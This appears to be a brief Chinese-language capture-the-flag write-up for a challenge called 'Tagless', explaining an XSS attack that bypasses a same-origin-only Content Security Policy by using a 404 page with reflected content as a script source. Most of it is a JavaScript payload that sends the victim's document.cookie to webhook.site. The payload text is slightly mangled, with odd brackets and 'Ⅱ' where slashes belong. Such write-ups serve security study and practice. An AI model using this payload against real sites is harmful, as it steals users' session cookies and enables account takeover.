---
tags: [XSS, CSP绕过, 404页面利用, 任意脚本加载]
---

# Tagless

 

CSP只允许加载同源下的js， 404页面可以控制返回内容， 用注释符去除冗杂内容。

 



```
*asdasd*/

var xhr = new XML[HttpRequest](HttpRequest)();xhr.open('get','https:Ⅱwebhook.site/' + encodeURI(document .cookie)) ;xhr .send() ; Ⅱ
```

